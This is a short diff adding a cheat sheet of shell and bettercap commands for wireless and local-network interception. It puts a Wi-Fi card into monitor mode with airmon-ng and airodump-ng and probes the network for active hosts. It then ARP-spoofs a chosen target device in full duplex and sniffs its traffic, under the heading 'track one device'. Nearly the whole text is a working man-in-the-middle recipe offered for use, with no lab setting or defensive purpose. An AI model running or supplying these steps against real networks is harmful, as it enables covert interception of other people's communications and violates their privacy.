@@ -1,0 +1,22 @@
+👉️ GENERAL TRACK
+ifconfig👉️
+sudo airmon-ng wlan0
+ifconfig
+sudo airodump-ng wlan0mon
+
+
+👉️ BETTERCAP INSTALL
+sudo apt install bettercap
+
+
+👉️ GET ALL CONNECTION
+sudo bettercap
+net.probe on //show active connections
+net.show //all connections
+
+👉️ TRACK ONE DEVICE
+set arp.spoof.fullduplex true
+set arp.spoof.targets tergetIP
+arp.spoof on
+arp.sniff on
+
